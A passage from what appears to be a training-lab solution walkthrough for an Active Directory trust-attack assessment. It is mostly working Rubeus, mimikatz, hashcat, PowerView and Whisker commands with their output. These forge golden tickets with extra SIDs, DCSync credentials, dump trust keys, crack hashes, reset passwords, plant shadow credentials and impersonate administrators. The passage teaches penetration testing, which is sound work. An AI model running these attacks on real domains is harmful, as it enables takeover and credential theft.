SID               : S-1-5-21-990245489-431684941-3923950027-1112
```

They will proceed to enumerate the domain users of `apexcargo.ad` which will be used in the subsequent attack.

Code: powershell

```powershell
Get-DomainUser -Domain apexcargo.ad
```

```
PS C:\Users\htb-student> Get-DomainUser -Domain apexcargo.ad

<SNIP>
logoncount            : 0
badpasswordtime       : 12/31/1600 6:00:00 PM
distinguishedname     : CN=Mika,CN=Users,DC=apexcargo,DC=ad
objectclass           : {top, person, organizationalPerson, user}
displayname           : Mika
userprincipalname     : mika@apexcargo.ad
name                  : Mika
objectsid             : S-1-5-21-990245489-431684941-3923950027-1111
samaccountname        : mika
codepage              : 0
samaccounttype        : USER_OBJECT
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 4/1/2024 4:15:54 PM
instancetype          : 4
usncreated            : 20568
objectguid            : b4fab4c7-15cd-490b-93c4-f9c03f942e77
lastlogoff            : 12/31/1600 6:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=apexcargo,DC=ad
dscorepropagationdata : 1/1/1601 12:00:00 AM
givenname             : Mika
lastlogon             : 12/31/1600 6:00:00 PM
badpwdcount           : 0
cn                    : Mika
useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated           : 4/1/2024 4:15:54 PM
primarygroupid        : 513
pwdlastset            : 4/1/2024 11:15:54 AM
usnchanged            : 20573
```

Students will proceed to request a golden ticket-granting ticket (TGT) using `Rubeus.exe` , then perform a DCSync attack targeting the `apexcargo\Administrator` user, where students will utilize his `NTLM` (`rc4`) hash to request a ticket-granting ticket.

Code: powershell

```powershell
.\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:inlanefreight.ad /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-3923950027-1112 /user:Administrator /ptt
.\mimikatz.exe "lsadump::dcsync /user:apexcargo\administrator /domain:apexcargo.ad" exit
```

```
PS C:\Users\htb-student> .\Rubeus.exe golden /rc4:6f639a6054a3d9852409e9ad7e41893b /domain:inlanefreight.ad /sid:S-1-5-21-1407615112-106284543-3058975305 /sids:S-1-5-21-990245489-431684941-3923950027-1112 /user:Administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : INLANEFREIGHT.AD (INLANEFREIGHT)
[*] SID            : S-1-5-21-1407615112-106284543-3058975305
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-990245489-431684941-3923950027-1112
[*] ServiceKey     : 6F639A6054A3D9852409E9AD7E41893B
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 6F639A6054A3D9852409E9AD7E41893B
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : inlanefreight.ad

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'Administrator@inlanefreight.ad'

[*] AuthTime       : 4/30/2024 2:59:55 AM
[*] StartTime      : 4/30/2024 2:59:55 AM

<SNIP>

 SU5MQU5FRlJFSUdIVC5BRKklMCOgAwIBAqEcMBobBmtyYnRndBsQaW5sYW5lZnJlaWdodC5hZA==

[+] Ticket successfully imported!

PS C:\Users\htb-student> .\mimikatz.exe "lsadump::dcsync /user:apexcargo\administrator /domain:apexcargo.ad" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:apexcargo\administrator /domain:apexcargo.ad
[DC] 'apexcargo.ad' will be the domain
[DC] 'DC03.apexcargo.ad' will be the DC server
[DC] 'apexcargo\administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 4/6/2024 5:40:03 PM
Object Security ID   : S-1-5-21-990245489-431684941-3923950027-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 2cd9f13c4aa3b468308525a93696e5a1
    ntlm- 0: 2cd9f13c4aa3b468308525a93696e5a1
    ntlm- 1: 64cbb76dcafe2e977794f6251f8231fb
    lm  - 0: 75e0a5932306d3a73e6d77db9b10f853
<SNIP>

PS C:\Users\htb-student> .\Rubeus.exe asktgt /user:Administrator /rc4:2cd9f13c4aa3b468308525a93696e5a1 /domain:apexcargo.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2cd9f13c4aa3b468308525a93696e5a1
[*] Building AS-REQ (w/ preauth) for: 'apexcargo.ad\Administrator'
[*] Using domain controller: 172.16.114.10:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<SNIP>
 R08uQUSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGFwZXhjYXJnby5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/apexcargo.ad
  ServiceRealm             :  APEXCARGO.AD
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  APEXCARGO.AD
  StartTime                :  4/30/2024 3:05:13 AM
  EndTime                  :  4/30/2024 1:05:13 PM
  RenewTill                :  5/7/2024 3:05:13 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Y4bwOZQNGI2c3rbUD/GNlA==
  ASREP (key)              :  2CD9F13C4AA3B468308525A93696E5A1
```

Having imported the Kerberos tickets into memory, students can obtain the flag:

Code: powershell

```powershell
type \\DC03.apexcargo.ad\C$\Users\Administrator\Desktop\flag.txt
```

```
PS C:\Users\htb-student> type \\DC03.apexcargo.ad\C$\Users\Administrator\Desktop\flag.txt

HTB{D1SABLE_SID_HISTORY}
```

Answer: `HTB{D1SABLE_SID_HISTORY}`

# Active Directory Trust Attacks - Skills Assessment

## Question 3

### "Gain access to the DC04 (Mssp.ad) and submit the contents of the flag located in "C:\\Users\\Administrator\\Desktop\\flag.txt""

With the previously established RDP session and the imported Kerberos tickets into memory, students will proceed to enumerate the trusts that the `apexcargo.ad` domain has using `Get-DomainTrust` cmdlet:

Code: powershell

```powershell
Get-DomainTrust -Domain apexcargo.ad
```

```
PS C:\Users\htb-student> Get-DomainTrust -Domain apexcargo.ad

<SNIP>

SourceName      : apexcargo.ad
TargetName      : mssp.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 4/1/2024 5:49:07 PM
WhenChanged     : 4/1/2024 6:00:46 PM
```

Students will have to transfer `mimikaz.exe` alongside with `Rubeus.exe` to `DC03.apexcargo.ad` and enter into a PowerShell session using `Enter-PSSession`, then proceed with the execution of the extracting the forest trust keys:

Code: powershell

```powershell
copy .\mimikatz.exe \\DC03.apexcargo.ad\C$\Users\Administrator\Documents
copy .\Rubeus.exe \\DC03.apexcargo.ad\C$\Users\Administrator\Documents
Enter-PSSession DC03.apexcargo.ad
.\mimikatz.exe "lsadump::trust /patch" exit
```

```
PS C:\Users\htb-student> copy .\mimikatz.exe \\DC03.apexcargo.ad\C$\Users\Administrator\Documents
PS C:\Users\htb-student> copy .\Rubeus.exe \\DC03.apexcargo.ad\C$\Users\Administrator\Documents
PS C:\Users\htb-student> Enter-PSSession DC03.apexcargo.ad
[DC03.apexcargo.ad]: PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::trust /patch" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::trust /patch

Current domain: APEXCARGO.AD (APEXCARGO / S-1-5-21-990245489-431684941-3923950027)

<SNIP>

Domain: MSSP.AD (MSSP / S-1-5-21-4048521676-651968119-1744346750)
 [  In ] APEXCARGO.AD -> MSSP.AD

 [ Out ] MSSP.AD -> APEXCARGO.AD
    * 4/1/2024 12:49:07 PM - CLEAR   - 24 00 2e 00 38 00 45 00 52 00 43 00 62 00 29 00 34 00 2f 00 4f 00 5f 00 21 00 4a 00 74 00
        * aes256_hmac       1feaa6305dbfea6c9272453c5f2db9cde96fd785d302a4bf0a2e0782e86c7a49
        * aes128_hmac       fec8281e6115bda3350072195a94d2bf
        * rc4_hmac_nt       072f376106bee87ba2433ffc825af3e7

 [ In-1] APEXCARGO.AD -> MSSP.AD

 [Out-1] MSSP.AD -> APEXCARGO.AD
    * 4/1/2024 12:49:07 PM - CLEAR   - 24 00 2e 00 38 00 45 00 52 00 43 00 62 00 29 00 34 00 2f 00 4f 00 5f 00 21 00 4a 00 74 00
        * aes256_hmac       1feaa6305dbfea6c9272453c5f2db9cde96fd785d302a4bf0a2e0782e86c7a49
        * aes128_hmac       fec8281e6115bda3350072195a94d2bf
        * rc4_hmac_nt       072f376106bee87ba2433ffc825af3e7

<SNIP>
```

With the obtained `rc4` value students will proceed to request a ticket-granting ticket (TGT) of the machine account `apexcargo$`, and import the ticket in memory.

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:apexcargo$ /domain:mssp.ad /rc4:072f376106bee87ba2433ffc825af3e7 /ptt
```

```
[DC03.apexcargo.ad]: PS C:\Users\Administrator\Documents> .\Rubeus.exe asktgt /user:apexcargo$ /domain:mssp.ad /rc4:072f376106bee87ba2433ffc825af3e7 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 072f376106bee87ba2433ffc825af3e7
[*] Building AS-REQ (w/ preauth) for: 'mssp.ad\apexcargo$'
[*] Using domain controller: 172.16.114.15:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
<SNIP>
 U1NQLkFEqRwwGqADAgECoRMwERsGa3JidGd0Gwdtc3NwLmFk
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/mssp.ad
  ServiceRealm             :  MSSP.AD
  UserName                 :  apexcargo$ (NT_PRINCIPAL)
  UserRealm                :  MSSP.AD
  StartTime                :  4/30/2024 3:56:27 AM
  EndTime                  :  4/30/2024 1:56:27 PM
  RenewTill                :  5/7/2024 3:56:27 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  MP9WP0uD4ef6OJxRHNvCHQ==
  ASREP (key)              :  072F376106BEE87BA2433FFC825AF3E7
```

Students can proceed to grab the flag:

Code: powershell

```powershell
type \\DC04.mssp.ad\C$\Users\Administrator\Desktop\flag.txt
```

```
[DC03.apexcargo.ad]: PS C:\Users\Administrator\Documents> type \\DC04.mssp.ad\C$\Users\Administrator\Desktop\flag.txt

HTB{TRU5T_ACCOUNT_PWN}
```

Answer: `HTB{TRU5T_ACCOUNT_PWN}`

# Active Directory Trust Attacks - Skills Assessment

## Question 4

### "Gain access to the DC05 (Fabricorp.ad) and submit the contents of the flag located in "C:\\Users\\Administrator\\Desktop\\flag.txt""

Within the PowerShell session on `DC03.apexcargo.ad` students will proceed to enumerate the trust between the domains `mssp.ad` and `fabricorp.ad` finding out the `bidirectional` trust:

Code: powershell

```powershell
Get-DomainTrust -Domain mssp.ad
```

```
[DC03.apexcargo.ad]: PS C:\Users\Administrator\Documents> Get-DomainTrust -Domain mssp.ad

<SNIP>

SourceName      : mssp.ad
TargetName      : fabricorp.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 4/1/2024 6:11:36 PM
WhenChanged     : 4/2/2024 5:24:01 PM
```

Students will have to run SharpHound and based on the information they will be led to discover that every user in the `Domain Users` group is subsequently part of the `Administrators@MSSP.AD` group as well.

![[HTB Solutions/CPTS/z. images/b5bc47932c1eb08520e4e8f5c6e9be01_MD5.jpg]]

Subsequently, students will perform a DCSync attack targeting the `MSSP\harry` user:

Code: powershell

```powershell
.\mimikatz.exe "lsadump::dcsync /user:MSSP\harry /domain:mssp.ad" exit
```

```
[DC03.apexcargo.ad]: PS C:\Users\Administrator\Documents> .\mimikatz.exe "lsadump::dcsync /user:MSSP\harry /domain:mssp.ad" exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:MSSP\harry /domain:mssp.ad
[DC] 'mssp.ad' will be the domain
[DC] 'DC04.mssp.ad' will be the DC server
[DC] 'MSSP\harry' will be the user account

Object RDN           : harry

** SAM ACCOUNT **

SAM Username         : harry
User Principal Name  : harry@mssp.ad
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 4/1/2024 1:05:59 PM
Object Security ID   : S-1-5-21-4048521676-651968119-1744346750-1107
Object Relative ID   : 1107

Credentials:
  Hash NTLM: 528d7bd1a428ebf7aabde05ce31ffc23
    ntlm- 0: 528d7bd1a428ebf7aabde05ce31ffc23
    lm  - 0: bf40b5ec418d5159089dbee6bf4bc146
<SNIP>
```

Consequently cracking the NTLM password hash using the `rockyou.txt` dictionary file:

Code: shell

```shell
hashcat -m 1000 528d7bd1a428ebf7aabde05ce31ffc23 /usr/share/wordlists/rockyou.txt
```

```
─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-quwrcmmkdw]─[~]
└──╼ [★]$ hashcat -m 1000 528d7bd1a428ebf7aabde05ce31ffc23 /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: AMD EPYC 7543 32-Core Processor, 7854/7918 MB (1979 MB allocatable), 4MCU

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
=============================================================================================================================
* Device #2: pthread-AMD EPYC 7543 32-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

<SNIP>
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

528d7bd1a428ebf7aabde05ce31ffc23:Harrypotter

<SNIP>
```

Students will proceed to utilize the RDP connection with the initial target to establish another RDP connection with `DC04.mssp.ad` (`172.16.114.15`) with the credentials of the user `harry`, subsequently, they will have to mount the `C:\` drive as to be able to move the tools onto that machine.

Code: powershell

```powershell
net use
copy \\TSCLIENT\C\Users\htb-student\SharpHound.exe
copy \\TSCLIENT\C\Users\htb-student\Rubeus.exe
copy \\TSCLIENT\C\Users\htb-student\PowerView.ps1
```

```
PS C:\Users\harry> net use
New connections will be remembered.

Status       Local     Remote                    Network

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
The command completed successfully.

PS C:\Users\harry> copy \\TSCLIENT\C\Users\htb-student\SharpHound.exe
PS C:\Users\harry> copy \\TSCLIENT\C\Users\htb-student\Rubeus.exe
PS C:\Users\harry> copy \\TSCLIENT\C\Users\htb-student\PowerView.ps1
```

By enumerating both domains `mssp.ad` and `fabricorp.ad` students will come to know that the user `harry` has `GenericAll` permissions over the user `alex` who is part of the `fabricorp.ad` domain:

![[HTB Solutions/CPTS/z. images/08a2b9fbaef6338e11564b26c99d45b8_MD5.jpg]]

Subsequently, students will proceed to open `PowerShell` as Administrator, navigate to `C:\Users\harry`, and use `PowerView.ps1` to change the password of the user `alex`:

Code: powershell

```powershell
cd C:\Users\harry
Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'Ac@demy123' -Asplaintext -force
Set-DomainUserPassword -Identity alex -AccountPassword $pass -domain fabricorp.ad
```

```
PS C:\Windows\system32> cd C:\Users\harry
PS C:\Users\harry> Import-Module .\PowerView.ps1
PS C:\Users\harry> $pass = ConvertTo-SecureString 'Ac@demy123' -Asplaintext -force
PS C:\Users\harry> Set-DomainUserPassword -Identity alex -AccountPassword $pass -domain fabricorp.ad
```

They will proceed to request a ticket-granting ticket (TGT) using `Rubeus.exe` and import it into memory.

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt
```

```
PS C:\Users\harry> .\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 863EAD83343E2C19BC4F68C0380DDD41
[*] Building AS-REQ (w/ preauth) for: 'fabricorp.ad\alex'
[*] Using domain controller: 172.16.114.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<SNIP>

QUJSSUNPUlAuQUSpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGZhYnJpY29ycC5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/fabricorp.ad
  ServiceRealm             :  FABRICORP.AD
  UserName                 :  alex (NT_PRINCIPAL)
  UserRealm                :  FABRICORP.AD
  StartTime                :  4/30/2024 6:38:50 AM
  EndTime                  :  4/30/2024 4:38:50 PM
  RenewTill                :  5/7/2024 6:38:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  zrZsvSjmGdXS4MPBHQwPwA==
  ASREP (key)              :  863EAD83343E2C19BC4F68C0380DDD41
```

Students will come to know that the user `alex` is part of the `Account Operators Group` which has `GenericAll` permissions over the `Enterprise Key Admins` group.

![[HTB Solutions/CPTS/z. images/9110edc292f033cb9c2a9698a1a834a0_MD5.jpg]]

Subsequently, students need to open a new `PowerShell` terminal, request a TGT, and add `alex` to the `Enterprise Key Admins` group.

Code: powershell

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt
Import-Module .\PowerView.ps1
Add-DomainGroupMember -Identity "Enterprise Key Admins" -Members 'fabricorp\alex' -domain fabricorp.ad -verbose
```

```
PS C:\Users\harry> .\Rubeus.exe createnetonly /program:powershell.exe /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : H3TYZGQP
[*] Domain          : OL5C1J0K
[*] Password        : FSMJHRDM
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1320
[+] LUID            : 0x20aa1b

PS C:\Users\harry> .\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 863EAD83343E2C19BC4F68C0380DDD41
[*] Building AS-REQ (w/ preauth) for: 'fabricorp.ad\alex'
[*] Using domain controller: 172.16.114.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<SNIP>

[+] Ticket successfully imported!

  ServiceName              :  krbtgt/fabricorp.ad
  ServiceRealm             :  FABRICORP.AD
  UserName                 :  alex (NT_PRINCIPAL)
  UserRealm                :  FABRICORP.AD
  StartTime                :  4/30/2024 6:49:38 AM
  EndTime                  :  4/30/2024 4:49:38 PM
  RenewTill                :  5/7/2024 6:49:38 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  IWVBjI4Bl+bxFTpEucypQA==
  ASREP (key)              :  863EAD83343E2C19BC4F68C0380DDD41

PS C:\Users\harry> Import-Module .\PowerView.ps1
PS C:\Users\harry> Add-DomainGroupMember -Identity "Enterprise Key Admins" -Members 'fabricorp\alex' -domain fabricorp.ad -verbose
VERBOSE: [Get-PrincipalContext] Binding to domain 'fabricorp.ad'
VERBOSE: [Get-PrincipalContext] Binding to domain 'fabricorp.ad'
VERBOSE: [Add-DomainGroupMember] Adding member 'fabricorp\alex' to group 'Enterprise Key Admins'
```

Right after, they will proceed to perform a `shadow credential` attack targeting the `msDS-KeyCredentialLink` attribute.

![[HTB Solutions/CPTS/z. images/859b580e6eb37b47e5241c176471e722_MD5.jpg]]

Students will have to download `Whisker.exe` and transfer it to the internal `172.16.118.10` machine:

Code: shell

```shell
wget https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/Whisker.exe
```

```
┌─[us-academy-3]─[10.10.14.195]─[htb-ac-8414@htb-quwrcmmkdw]─[~]
└──╼ [★]$ wget https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/Whisker.exe

--2024-04-30 12:54:52--  https://raw.githubusercontent.com/Flangvik/SharpCollection/master/NetFramework_4.7_Any/Whisker.exe
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 41984 (41K) [application/octet-stream]
Saving to: ‘Whisker.exe’

Whisker.exe                        100%[===============================================================>]  41.00K  --.-KB/s    in 0s      

2024-04-30 12:54:53 (99.3 MB/s) - ‘Whisker.exe’ saved [41984/41984]
```

Subsequently, students will have to create a new PowerShell session using `Rubeus.exe` and request a ticket-granting ticket (TGT), while importing it to memory:

Code: powershell

```powershell
.\Rubeus.exe createnetonly /program:powershell.exe /show
.\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt
```

```
PS C:\Users\harry> .\Rubeus.exe createnetonly /program:powershell.exe /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : True
[*] Username        : UTNMMPAF
[*] Domain          : XRFOQCFQ
[*] Password        : FL3THSQ2
[+] Process         : 'powershell.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 6704
[+] LUID            : 0x1b6b5b

PS C:\Users\harry> .\Rubeus.exe asktgt /user:alex /password:'Ac@demy123' /domain:fabricorp.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 863EAD83343E2C19BC4F68C0380DDD41
[*] Building AS-REQ (w/ preauth) for: 'fabricorp.ad\alex'
[*] Using domain controller: 172.16.114.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

<SNIP>

      MzJaqA4bDEZBQlJJQ09SUC5BRKkhMB+gAwIBAqEYMBYbBmtyYnRndBsMZmFicmljb3JwLmFk
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/fabricorp.ad
  ServiceRealm             :  FABRICORP.AD
  UserName                 :  alex (NT_PRINCIPAL)
  UserRealm                :  FABRICORP.AD
  StartTime                :  4/30/2024 7:40:32 AM
  EndTime                  :  4/30/2024 5:40:32 PM
  RenewTill                :  5/7/2024 7:40:32 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  YN9uX+vFYPJMpbbB7QMZOw==
  ASREP (key)              :  863EAD83343E2C19BC4F68C0380DDD41
```

With the imported ticket into memory, students will proceed to utilize `Whisker.exe` targeting the `msDS-KeyCredentialLink` attribute:

Code: powershell

```powershell
.\Whisker.exe add /target:DC05$ /domain:fabricorp.ad /dc:DC05.fabricorp.ad
```

```
PS C:\Users\harry> .\Whisker.exe add /target:DC05$ /domain:fabricorp.ad /dc:DC05.fabricorp.ad

[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password jYJjsxZvwvladVpK
[*] Searching for the target account
[*] Target user found: CN=DC05,OU=Domain Controllers,DC=fabricorp,DC=ad
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID e9f4c0e7-25db-4e23-bd1a-3dbc7b222cbc
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:DC05$ /certificate <SNIP>
```

Subsequently, students need to copy the generated `Rubeus.exe` command from `Whisker.exe` and run it:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:DC05$ /certificate:MIIJsBf8EggX7MIIF9zCCBfM <SNIP> /3uK4rVzC11b+a00TfdYgCAgfQ /password:"jYJjsxZvwvladVpK" /domain:fabricorp.ad /dc:DC05.fabricorp.ad /getcredentials /show /nowrap
```

```
PS C:\Users\harry> .\Rubeus.exe asktgt /user:DC05$ /certificate:MIIJsBf8EggX7MIIF9zCCBfM <SNIP> /3uK4rVzC11b+a00TfdYgCAgfQ /password:"jYJjsxZvwvladVpK" /domain:fabricorp.ad /dc:DC05.fabricorp.ad /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC05$
[*] Building AS-REQ (w/ PKINIT preauth) for: 'fabricorp.ad\DC05$'
[*] Using domain controller: 172.16.114.20:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGPDCCBjigAwIBBaEDAgEWoo 
      
<SNIP>

ServiceName              :  krbtgt/fabricorp.ad
  ServiceRealm             :  FABRICORP.AD
  UserName                 :  DC05$ (NT_PRINCIPAL)
  UserRealm                :  FABRICORP.AD
  StartTime                :  4/30/2024 7:45:40 AM
  EndTime                  :  4/30/2024 5:45:40 PM
  RenewTill                :  5/7/2024 7:45:40 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  x1XCmm2Vcg+U9/aX4pjtCA==
  ASREP (key)              :  5430FD1B9BBB2D68CE75699D291614A9

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : BB69782E8243ADF13BCD559CCC85513
```

Consequently, having obtained a ticket-granting ticket students will proceed to perform a `s4u` attack impersonating the `Administrator@fabricorp.ad` user:

```powershell
.\Rubeus.exe s4u /dc:DC05.fabricorp.ad /impersonateuser:Administrator@fabricorp.ad /self /service:host/DC05.fabricorp.ad /altservice:cifs/DC05.fabricorp.ad /ptt /ticket:doIGPDCC <SNIP> hZA==
```
```
PS C:\Users\harry> .\Rubeus.exe s4u /dc:DC05.fabricorp.ad /impersonateuser:Administrator@fabricorp.ad /self /service:host/DC05.fabricorp.ad /altservice:cifs/DC05.fabricorp.ad /ptt /ticket:doIGPDCCBjig <SNIP> C5hZA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
